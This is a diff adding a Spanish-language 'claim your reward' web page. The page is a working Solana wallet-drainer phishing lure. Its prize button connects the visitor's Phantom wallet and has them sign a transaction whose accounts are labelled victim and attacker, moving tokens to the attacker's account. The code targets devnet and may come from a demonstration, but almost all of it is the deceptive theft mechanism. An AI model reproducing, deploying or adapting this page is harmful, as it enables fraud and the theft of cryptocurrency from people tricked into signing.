@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>🎁 Recompensa Especial</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #0d1117;
+      color: #ffffff;
+      text-align: center;
+      padding: 40px;
+    }
+    .card {
+      background: #161b22;
+      padding: 30px;
+      border-radius: 15px;
+      max-width: 400px;
+      margin: auto;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+    }
+    button {
+      background: #1abc9c;
+      border: none;
+      padding: 15px 30px;
+      color: #fff;
+      font-size: 18px;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background: #16a085;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎉 Has sido seleccionado</h1>
+    <p>¡Reclama tu recompensa exclusiva ahora!</p>
+    <button id="claimBtn">Reclamar premio</button>
+  </div>
+
+  <!-- Wallet Adapter Scripts -->
+  <script src="https://unpkg.com/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
+
+  <script>
+    const claimBtn = document.getElementById("claimBtn");
+    const { Connection, PublicKey, Transaction, TransactionInstruction } = solanaWeb3;
+    const network = "https://api.devnet.solana.com";
+
+    const PROGRAM_ID = new PublicKey("ChzBcsMoHq4SPyTA17gT65GYc8H4D5n3pVWJoYFCYQN8");
+    const PDA_ACCOUNT = new PublicKey("56ZBJCYNdqm72LaDoYe6vpHnNndqVg2ScioQbhrdUrve");
+    const TOKEN_ACCOUNT_VICTIM = new PublicKey("CxQNoC4V17AzBNZmaSKcMvavrxMQHFeUjFatisvtq6jx");
+    const TOKEN_ACCOUNT_ATTACKER = new PublicKey("9vXiqq5gmcL47teMGMMmuHYrTK2HeU6Ad8xnP8xPte8V");
+    const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+    const SYSTEM_PROGRAM_ID = new PublicKey("11111111111111111111111111111111");
+    const ATTACKER_WALLET = new PublicKey("31DQqjyihtRcdeX5vNPkFdxwh9PpGQQQvy87BKaNvtYx");
+
+    async function connectWallet() {
+      if (window.solana && window.solana.isPhantom) {
+        try {
+          const resp = await window.solana.connect();
+          return resp.publicKey;
+        } catch (err) {
+          alert("❌ Conexión rechazada.");
+        }
+      } else {
+        alert("❌ No se detectó una wallet compatible con Solana (Phantom, Solflare, etc). Instálala para continuar.");
+      }
+    }
+
+    claimBtn.addEventListener("click", async () => {
+      const publicKey = await connectWallet();
+      if (!publicKey) return;
+
+      const connection = new Connection(network, "confirmed");
+      const blockhash = await connection.getLatestBlockhash();
+
+      const instruction = new TransactionInstruction({
+        keys: [
+          { pubkey: publicKey, isSigner: true, isWritable: true },
+          { pubkey: TOKEN_ACCOUNT_VICTIM, isSigner: false, isWritable: true },
+          { pubkey: PROGRAM_ID, isSigner: false, isWritable: false },
+          { pubkey: ATTACKER_WALLET, isSigner: false, isWritable: false },
+          { pubkey: TOKEN_ACCOUNT_ATTACKER, isSigner: false, isWritable: true },
+          { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+          { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
+          { pubkey: PDA_ACCOUNT, isSigner: false, isWritable: true },
+        ],
+        programId: PROGRAM_ID,
+        data: new Uint8Array([])
+      });
+
+      const tx = new Transaction({
+        feePayer: publicKey,
+        recentBlockhash: blockhash.blockhash
+      }).add(instruction);
+
+      try {
+        const signed = await window.solana.signTransaction(tx);
+        const sig = await connection.sendRawTransaction(signed.serialize());
+        await connection.confirmTransaction(sig);
+        alert("✅ Transacción enviada: " + sig);
+      } catch (err) {
+        alert("❌ Error: " + err.message);
+      }
+    });
+  </script>
+</body>
+</html>
